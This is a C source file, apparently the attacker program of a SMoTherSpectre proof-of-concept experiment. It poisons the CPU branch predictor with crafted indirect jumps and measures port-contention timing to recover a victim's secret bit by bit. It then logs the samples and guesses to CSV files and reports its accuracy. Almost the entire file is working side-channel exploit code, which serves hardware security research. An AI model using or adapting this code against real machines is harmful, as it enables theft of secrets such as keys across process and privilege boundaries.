#define _GNU_SOURCE

#include <assert.h>
#include <inttypes.h>
#include <signal.h>
#include <stdbool.h>
#include <x86intrin.h>

#include "config.h"
#include "macros.h"
#include "synch.h"
#include "util.h"
#include "gadgets_description.h"

static_assert(NBITS <= 8, "Max 8 bits since secret assumed to be uint8");

volatile void *ptr;

void store_stats(char *, uint8_t *);
void sigint_handler(int);

/************** SMoTherSpectre experiment ******************/
uint64_t __attribute__((aligned(4096)))
smotherSpectreIter(uint64_t bit_offset, synch *s, uint64_t secret) {
  register uint64_t tsc, tmp;
  unsigned junk;
  register void *first_jmp;

  const uint64_t sources[] = {0xcafebabe, 0xdeadbeed, 0xabcdabcd, 0xc001d00d};
  SET_GP_REGISTERS(sources);

  /* set the indirect jump target for poisoning */
  ptr = &&SPECULATE_THIS;
  first_jmp = (void *)((uintptr_t)ptr - (SIZEOF_SHIFT_JUMP * bit_offset));

  synch_sync(s);
  
  /* prepare branch predictor state */
  PADDING(0x10);
  asm("BEG:;");
  JMPNEXT64

  /* indirect jump, poison's victim BTB as a side-effect */
  asm("JUMP:;");
  JMP_EXPL(first_jmp, "rcx");
  PADDING(256);

  /* victim's real target - do nothing */
  asm("TARGET:;");
  asm("jmp END;");
  PADDING(256);

  /* Shifts by various lengths. All empty except jump to pointer */
  SHIFT_JUMPA(7, ptr, secret);
  SHIFT_JUMPA(6, ptr, secret);
  SHIFT_JUMPA(5, ptr, secret);
  SHIFT_JUMPA(4, ptr, secret);
  SHIFT_JUMPA(3, ptr, secret);
  SHIFT_JUMPA(2, ptr, secret);
  SHIFT_JUMPA(1, ptr, secret);
  /* gather timing information */
SPECULATE_THIS:
  ATTACKER_TIMING

  asm("END:;");

  return tsc;
}

/************** Side channel processing   *****************/
uint64_t __attribute__((aligned(4096))) 
samples[NCHARS][8][NSAMPLES];

int __attribute__((aligned(4096)))
main(int argc, char **argv) {
  synch s;
  unsigned i, j, k, core;

  /* Clear samples */
  memset(samples, 0, sizeof(samples));

  // TODO:Scratch, DEBUG 
  printf("SMotherspectre iter: %p\n", smotherSpectreIter);

  /* Verify args */
	VERIFY(argc >= 4, "Usage: ./attack <core> <data output folder> <secret>\n");
	sscanf(argv[1], "%u", &core);
  pin(core);

  /* Connect to shared memory for synchronization */
  synch_connect(&s);

  /* Catch interrupt signal */
  struct sigaction signal_cfg;
  memset(&signal_cfg, 0, sizeof(signal_cfg));
  signal_cfg.sa_handler = sigint_handler;
  VERIFY(sigaction(SIGINT, &signal_cfg, NULL) == 0, 
         "Unable to install signal handler on attacker\n");

  for(i = 0; i < NCHARS; i++){
    for(j = 0; j < NBITS; j++)
      for(k = 0; k < NSAMPLES; k++)
        samples[i][j][k] = smotherSpectreIter(j, &s, 0);
  }
  // TODO:Scratch, DEBUG 
  printf("Final\n");

  char *out_dir = argv[2];
  char *secret = argv[3];
  store_stats(out_dir, secret);

  return 0;
}

/************** Statistics and storage    *****************/
uint64_t mean(uint64_t *samples, unsigned n_samples) {
	uint64_t sum = 0;
	for(unsigned i = 0; i < n_samples; i++)
		sum += samples[i];
	sum /= n_samples;
	return sum;
}

int guess_bit(uint64_t *samples) {
  //TODO: Add other operations like median
  uint64_t (*stat)(uint64_t *, unsigned) = mean;

  return (stat(samples, NSAMPLES) THRESHOLD_OP THRESHOLD);
}

void store_stats(char *out_dir, uint8_t *secret) {
  char filename_buffer[128];


  /* Store all timing samples to file.
   * Format is csv, NSAMPLES per line, NCHARS*8 lines
   * Lines are ordered character-majorwise 
   * Timings are stored for all 8 bits, irrespective of how
   * many bits are actually attacked */
  snprintf(filename_buffer, 128, "%s/attacker_samples.csv", out_dir);
  FILE *samples_fp = fopen(filename_buffer, "w+");
  for(unsigned i = 0; i < NCHARS; i++)
    for(unsigned j = 0; j < 8; j++) {
      for(unsigned k = 0; k < NSAMPLES; k++) 
        fprintf(samples_fp, ((k == 0)? "%"PRIu64 : ", %"PRIu64), samples[i][j][k]);
      fprintf(samples_fp, "\n");
    }
  fflush(samples_fp);
  fclose(samples_fp);

  /* Do actual guessing */
  uint8_t guess[NCHARS];
  memset(guess, 0, sizeof(guess));
  for(unsigned i = 0; i < NCHARS; i++)
    for(unsigned j = 0; j < NBITS; j++)
      guess[i] |= guess_bit(samples[i][j]) << j;

  /* Store all guesses bit-by-bit to file */
  snprintf(filename_buffer, 128, "%s/attacker_bit_guesses.csv", out_dir);
  FILE *bit_guess_fp = fopen(filename_buffer, "w+");
  for(unsigned i = 0; i < NCHARS; i++) {
    for(unsigned j = 0; j < 8; j++)
      fprintf(bit_guess_fp, "%1"PRIu8", ", (guess[i] >> j) & 0x1);
    fprintf(bit_guess_fp, "%2"PRIx8"\n", guess[i]);
  }
  fclose(bit_guess_fp);

  /* Check accuracy (bitwise, total)*/
  unsigned incorrect[NBITS] = {0};
  for(unsigned i = 0; i < NCHARS; i++) {
    uint8_t diff = secret[i] ^ guess[i];
    for(unsigned j = 0; j < NBITS; j++)
      if((diff >> j) & 1)
        incorrect[j]++;
  }
  unsigned total_bits = NCHARS * NBITS;
  unsigned total_incorrect = 0;
  for(unsigned j = 0; j < NBITS; j++) {
    printf("Bit %u, correct %lu percent\n", j, ((NCHARS - incorrect[j]) * 100 / NCHARS));
    total_incorrect += incorrect[j];
  }
  printf("Total %d, correct %d, percentage: %d percent\n", total_bits, total_bits - total_incorrect, (total_bits - total_incorrect) * 100 / total_bits);

  /* Dump secret bits */
  snprintf(filename_buffer, 128, "%s/secret_bits.csv", out_dir);
  FILE *secret_fp = fopen(filename_buffer, "w+");  
  for(unsigned i = 0; i < NCHARS; i++) {
    for(unsigned j = 0; j < 8; j++)
      fprintf(secret_fp, ((j == 0)? "%"PRIu8 : ", %"PRIu8), (secret[i] >> j) & 0x1);
    fprintf(secret_fp, "\n");
  }
  fclose(secret_fp);
}

/******************** Signal handling     ******************/
void sigint_handler(int sig) {
  printf("Handling signal %d\n", sig);

  if(sig == SIGINT){
    // store_stats("data/whatever", SECRET);
    exit(0);
  }
}